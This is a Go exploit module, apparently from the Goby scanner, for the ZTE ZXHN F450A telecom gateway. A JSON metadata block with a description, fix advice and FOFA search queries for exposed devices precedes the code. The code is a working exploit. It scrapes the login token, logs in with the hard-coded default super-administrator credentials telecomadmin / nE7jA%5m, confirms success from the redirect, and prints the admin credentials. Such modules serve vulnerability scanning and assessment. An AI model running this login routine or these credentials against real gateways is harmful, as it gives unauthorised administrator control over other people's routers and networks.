package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Telecom ZXHN F450A Gateway Default Administrator Account Password Vulnerability",
    "Description": "<p>ZTE F450A Gateway is an intelligent gateway product integrating bandwidth management, routing settings, network diagnosis and other functions.</p><p>There is a default administrator account password vulnerability in ZTE F450A gateway. An attacker can control the entire platform through the default password vulnerability, and use administrator privileges to operate core functions.</p>",
    "Product": "ZXHN-F450A",
    "Homepage": "https://www.zte.com.cn/",
    "DisclosureDate": "2022-11-18",
    "Author": "heiyeleng",
    "FofaQuery": "title=\"ZXHN F450A\"",
    "GobyQuery": "title=\"ZXHN F450A\"",
    "Level": "3",
    "Impact": "<p>Attackers can control the entire platform through default password vulnerabilities and use administrator privileges to operate core functions.</p>",
    "Recommendation": "<p>1. Change the default account and password to one that is hard to guess;</p><p>2. Strengthen the strict use of password specifications.</p>",
    "References": [
        "https://fofa.info"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.0",
    "Translation": {
        "CN": {
            "Name": "电信中兴 F450A 网关默认管理员账号密码漏洞",
            "Product": "ZXHN-F450A",
            "Description": "<p>电信中兴F450A网关是一款集带宽管理、路由设置、网络诊断等功能于一体的智能网关产品。<br></p><p>电信中兴F450A网关存在默认管理员账号密码漏洞，攻击者可通过默认口令漏洞控制整个平台，使用管理员权限操作核心的功能。<br></p>",
            "Recommendation": "<p>1、对默认的账号密码进行修改为不易猜解到的账号和密码；</p><p>2、加强对密码规范的严格使用。</p>",
            "Impact": "<p>攻击者可通过默认口令漏洞控制整个平台，使用管理员权限操作核心的功能。<br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "Telecom ZXHN F450A Gateway Default Administrator Account Password Vulnerability",
            "Product": "ZXHN-F450A",
            "Description": "<p>ZTE F450A Gateway is an intelligent gateway product integrating bandwidth management, routing settings, network diagnosis and other functions.</p><p>There is a default administrator account password vulnerability in ZTE F450A gateway. An attacker can control the entire platform through the default password vulnerability, and use administrator privileges to operate core functions.</p>",
            "Recommendation": "<p>1. Change the default account and password to one that is hard to guess;</p><p>2. Strengthen the strict use of password specifications.</p>",
            "Impact": "<p>Attackers can control the entire platform through default password vulnerabilities and use administrator privileges to operate core functions.<br></p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10755"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			cfg := httpclient.NewGetRequestConfig("/")
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil && resp.StatusCode == 200 && strings.Contains(resp.RawBody, "document.fLogin.submit") {
				frm_Logintoken := regexp.MustCompile(`value = "(.*)";
document.fLogin.submit`).FindStringSubmatch(resp.Utf8Html)[1]
				cfg1 := httpclient.NewPostRequestConfig("/")
				cfg1.VerifyTls = false
				cfg1.FollowRedirect = false
				cfg1.Header.Store("Content-type", "application/x-www-form-urlencoded")
				cfg1.Data = "frashnum=&action=login&Frm_Logintoken=" + frm_Logintoken + "&user_name=telecomadmin&Password=nE7jA%255m"
				if resp, err := httpclient.DoHttpRequest(u, cfg1); err == nil {
					return resp.StatusCode == 302 && strings.Contains(resp.HeaderString.String(), "Location: /start.ghtml")
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cfg := httpclient.NewGetRequestConfig("/")
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil && resp.StatusCode == 200 && strings.Contains(resp.RawBody, "document.fLogin.submit") {
				frm_Logintoken := regexp.MustCompile(`value = "(.*)";
document.fLogin.submit`).FindStringSubmatch(resp.Utf8Html)[1]
				cfg1 := httpclient.NewPostRequestConfig("/")
				cfg1.VerifyTls = false
				cfg1.FollowRedirect = false
				cfg1.Header.Store("Content-type", "application/x-www-form-urlencoded")
				cfg1.Data = "frashnum=&action=login&Frm_Logintoken=" + frm_Logintoken + "&user_name=telecomadmin&Password=nE7jA%255m"
				if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err == nil {
					if resp.StatusCode == 302 && strings.Contains(resp.HeaderString.String(), "Location: /start.ghtml") {
						expResult.Output = "普通管理员：useradmin:nE7jA%5m\r\n超级管理员：telecomadmin:nE7jA%5m"
						expResult.Success = true
					}
				}
			}
			return expResult
		},
	))
}
